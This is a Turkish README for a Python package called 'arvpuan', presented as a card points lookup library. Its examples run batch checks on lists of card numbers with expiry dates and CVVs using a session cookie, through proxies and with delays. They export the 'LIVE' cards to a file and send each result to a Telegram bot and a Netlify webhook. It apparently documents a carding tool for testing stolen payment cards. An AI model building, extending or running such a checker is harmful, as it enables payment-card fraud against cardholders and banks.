# arvpuan

Kart puan sorgulama kütüphanesi. Telegram ve Netlify entegrasyonu ile sonuçları anında iletir.

## Kurulum

```bash
pip install arvpuan
```

## Hızlı Başlangıç

```python
from arvpuan import CardChecker

checker = CardChecker()
checker.set_cookies("YOUR_COOKIE")

result = checker.check_card("4111111111111111|01|26|123")
print(result)
```

## Toplu Kontrol

```python
from arvpuan import BatchChecker

batch = BatchChecker(
    cookie="YOUR_COOKIE",
    delay=20.0,
    on_result=lambda r: print(r),
    on_log=print,
)
batch.run(["4111...|01|26|123", "5500...|12|27|321"])
```

## Telegram Bildirimi

```python
from arvpuan import BatchChecker, TelegramNotifier

tg = TelegramNotifier(token="BOT_TOKEN", chat_id="CHAT_ID")

batch = BatchChecker(
    cookie="YOUR_COOKIE",
    on_result=tg.send,
    on_done=tg.send_summary,
)
batch.run(cards)
```

## Netlify Bildirimi

```python
from arvpuan import BatchChecker, NetlifyNotifier

nl = NetlifyNotifier(
    webhook_url="https://YOUR_SITE.netlify.app/.netlify/functions/cards",
    secret="YOUR_SECRET",
)

batch = BatchChecker(
    cookie="YOUR_COOKIE",
    on_result=nl.send,
)
batch.run(cards)
```

## Telegram + Netlify Birlikte

```python
from arvpuan import BatchChecker, TelegramNotifier, NetlifyNotifier

tg = TelegramNotifier(token="BOT_TOKEN", chat_id="CHAT_ID")
nl = NetlifyNotifier(webhook_url="https://YOUR_SITE.netlify.app/.netlify/functions/cards")

def on_result(r):
    tg.send(r)
    nl.send(r)

batch = BatchChecker(cookie="YOUR_COOKIE", on_result=on_result)
batch.run(cards)
```

## Proxy

```python
checker = CardChecker(proxy="http://user:pass@host:port")
```

## Dosyadan Kart Yükleme

```python
with open("cards.txt") as f:
    cards = [line.strip() for line in f if line.strip()]

batch.run(cards)
```

## Duraklat / Devam / Durdur

```python
thread = batch.run(cards, threaded=True)

batch.pause()
batch.resume()
batch.stop()
```

## Sonuçları Dışa Aktar

```python
batch.export_lives("lives.txt")   # sadece LIVE kartlar
batch.export_all("all.txt")       # tüm sonuçlar
```

## Kart Formatı

```
number|month|year|cvv
4111111111111111|01|26|123
4111111111111111;01;26;123
4111111111111111,01,26,123
4111111111111111 01 26 123
```

Yıl 2 veya 4 haneli olabilir.
